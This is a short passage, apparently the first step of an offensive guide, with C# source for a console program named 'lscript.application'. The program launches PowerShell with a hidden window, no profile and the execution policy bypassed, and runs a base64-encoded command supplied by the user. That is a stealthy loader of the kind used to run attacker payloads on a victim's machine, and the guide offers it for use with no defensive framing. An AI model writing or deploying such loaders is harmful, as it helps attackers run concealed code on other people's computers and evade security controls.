## 1. Create lscript.application

1. Go to Visual Studio Community edition
2. Create a C# Console application for Windows
3. In lscript.cs, write the following code ->

```
using System.Diagnostics;

static class Program {
    [System.STAThread]
    static void Main() {
        string encoded = "<YOUR_BASE64_STRING>";
        string psArgs = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}";
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
```

